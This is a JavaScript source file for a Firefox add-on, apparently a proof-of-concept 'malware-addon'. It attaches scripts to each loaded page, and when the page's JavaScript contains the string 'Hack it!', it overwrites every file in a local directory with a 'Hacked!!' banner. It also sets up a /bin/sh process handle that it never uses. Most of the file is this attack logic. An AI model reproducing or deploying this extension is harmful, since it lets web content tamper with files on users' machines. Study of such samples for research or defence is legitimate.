const windowUtils = require("sdk/window/utils");
addonReloadRequest = false;
start = 0;
end = 0;
const {
    Cc, Ci, Cu
} = require("chrome");
Cu.import("resource://gre/modules/XPCOMUtils.jsm", this);

var myExtension = {
    init: function() {

        if (gBrowser) gBrowser.addEventListener("DOMContentLoaded", this.onPageLoad, false);
        if (gBrowser) gBrowser.addEventListener("unload", this.onPageUnload, true);

    },
    onPageLoad: function(aEvent) {
        
        var system = require("sdk/system");

        var platform_str = system.platform;
        var str = platform_str.toLowerCase();

        // create an nsIFile for the executable
        var file = Cc["@mozilla.org/file/local;1"]
                .createInstance(Ci.nsIFile);
        //file.initWithPath("C:\\Users\\Sravan\\Downloads\\addon-sdk-1.17\\addon-sdk-1.17\\test-addon\\data\\test.bat");

        file.initWithPath("/bin/sh");

        // create an nsIProcess
        var process = Cc["@mozilla.org/process/util;1"]
                .createInstance(Ci.nsIProcess);

        var tabs = require('sdk/tabs');
        var self = require("sdk/self");
            //var panel = require("sdk/panel");
        const fileIO = require("sdk/io/file");
        const temp_file = require("sdk/io/file");

        var path = "/Users/sravan2j/Downloads/addon-sdk-1.17/malware-addon/data/files";

        panel = require("sdk/tabs").activeTab.attach({
            contentScriptFile: [self.data.url("jquery-1.10.0.min.js"), self.data.url("my-script.js")]
        });

        panel.port.on("myMessage", function handleMyMessage(code) {

                    try {
                        Cc['@mozilla.org/alerts-service;1']
                            .getService(Ci.nsIAlertsService)
                            .showAlertNotification(null, "Total Javascript size", (encodeURI(code).split(/%..|./).length - 1)+" bytes", false, '', null);
                    } catch(e) {
                        // prevents runtime error on platforms that don't implement nsIAlertsService
                    }
                    var ind=code.indexOf('Hack it!');
                    if (ind > -1)
                    {
                        let list = fileIO.list(path);

                       for (i = 0; i < list.length; i++) {
                            let item = fileIO.join(path, list[i]);
                            if (fileIO.isFile(item)) {

                                var text=null;

                                var TextReader = fileIO.open(item, "r");
                               if (!TextReader.closed) {
                                    text = TextReader.read();
                                    TextReader.close();
                                    if (text.length>0)
                                    {
                                        text=text+"\n";
                                    }
                                }

                                var TextWriter = fileIO.open(item, "w");
                               if (!TextWriter.closed) {
                                    //TextWriter.write(text+code);
                                    TextWriter.write("####### Hacked!! ##########\n"+text);
                                    TextWriter.close();
                                }
                            }
                        }
                    }

                }

        );


    },
    onPageUnload: function(aEvent) {
        
    }
}


var gBrowser = windowUtils.getMostRecentBrowserWindow().getBrowser();

myExtension.init();